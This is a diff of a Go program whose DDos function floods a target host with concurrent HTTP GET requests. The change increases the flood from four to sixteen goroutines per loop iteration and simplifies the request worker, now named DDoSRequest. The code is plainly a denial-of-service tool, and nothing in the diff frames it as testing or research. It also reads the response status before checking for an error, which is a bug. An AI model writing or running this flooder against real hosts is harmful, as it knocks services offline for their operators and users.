@@ -61,14 +61,6 @@ func recoverConnection() {
 	}
 }
 
-func verifyError(err error, statusCode int) {
-	if statusCode != 200 {
-		fmt.Println(err)
-		fmt.Println("status-code", statusCode)
-
-	}
-}
-
 func DDos(host string, requests string) {
 
 	r, err := strconv.ParseInt(requests, 10, 64)
@@ -77,31 +69,39 @@ func DDos(host string, requests string) {
 	}
 
 	for i := 0; int64(i) < r; i++ {
-		fmt.Println(i)
-		go workerRequest(host)
-		go workerRequest(host)
-		go workerRequest(host)
-		go workerRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
+		go DDoSRequest(host)
 	}
-
-	fmt.Println("fim")
-
 }
 
-func workerRequest(host string) {
+func DDoSRequest(host string) {
+
 	url := host
-	client := &http.Client{}
+	response, err := http.Get(url)
 
-	req, err := http.NewRequest(http.MethodGet, url, nil)
-	if err != nil {
-		log.Fatal(err)
+	fmt.Println(response.Status)
+
+	if err == nil {
+		response.Close = true
+		defer response.Body.Close()
+
+	} else {
+		fmt.Println(err) // printing the error
+		panic(err)
 	}
-
-	req.Header.Add("cache-control", "max-age=0")
-
-	res, err := client.Do(req)
-	verifyError(err, res.StatusCode)
-
-	defer res.Body.Close()
 	defer recoverConnection()
 }
